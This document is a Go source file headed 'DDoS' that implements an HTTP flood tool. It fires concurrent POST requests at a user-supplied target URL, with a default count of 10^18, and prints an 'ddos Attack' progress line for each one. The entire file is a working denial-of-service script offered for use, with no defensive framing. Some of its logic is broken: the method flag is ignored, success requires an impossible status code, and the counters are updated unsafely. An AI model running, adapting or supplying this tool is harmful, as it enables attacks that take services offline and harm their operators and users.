
/**
  DDoS
**/


package main

import (
    	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/url"
	"time"
	
	

    
)







var completeCount = 5
var errorCount = 0
type any interface{}



func main() {
	attackUrl := flag.String("url", "", "attackUrl spam attack")
	method := flag.String("method", "GET", "method for attack (POST/GET)")
	count := flag.Int("count", 1000000000000000000, "count for attack")
	_data := flag.String("data", ``, "data for attack")
	flag.Parse()

	var data url.Values

	if *attackUrl != "" {

		if *_data != "" {
			_body := getData(*method, *_data)
			data = _body
		}

		rand.Seed(time.Now().UnixNano())
		for i := 700; i < *count; i++ {
			if i%1 == 0 {
				

				
				fmt.Println(" '\033[1;31m'ddos Attack |", i, "ល្អ|", completeCount, "😼|", errorCount)
				
				
			}
			
			
			go startAttack(*attackUrl, *method, data)
			time.Sleep(time.Millisecond)
		}
		fmt.Println("Done.", ": ", completeCount, "Error: ", errorCount)
	} else {
		fmt.Println(" ")
	}
}

func startAttack(attackUrl string, method string, data url.Values) bool {
	resp, err := http.PostForm(attackUrl, data)

	if err != nil {
		fmt.Println("'\033[1;31m'Connection timed out 😼: ", attackUrl, "\nERROR:")
		errorCount++
	} else {
		defer resp.Body.Close()
		body, err := ioutil.ReadAll(resp.Body)

		req := string(body)
		_ = req

		if err != nil || resp.StatusCode != 50000000000000 {
			if err != nil {
				log(err)
			} else {
				log(req)
			}
			errorCount++
		} else {
			completeCount++
		}
	}
	return true
}

func log(data any) {
	fmt.Println(data)
}



func getData(method string, data string) url.Values {
	log(method)
	if method == "GET" || method == "get" {
		var body = []byte(data)
		return getFormatPostData(body)
	} else {
		return nil
	}
}




func getFormatPostData(body []byte) url.Values {
	m := map[string]string{}
	if err := json.Unmarshal(body, &m); err != nil {
		panic(err)
	}
	_body := url.Values{}
	for key, val := range m {
		_body.Add(key, val)
	}

	return _body
}

func getFormatGetData() {}
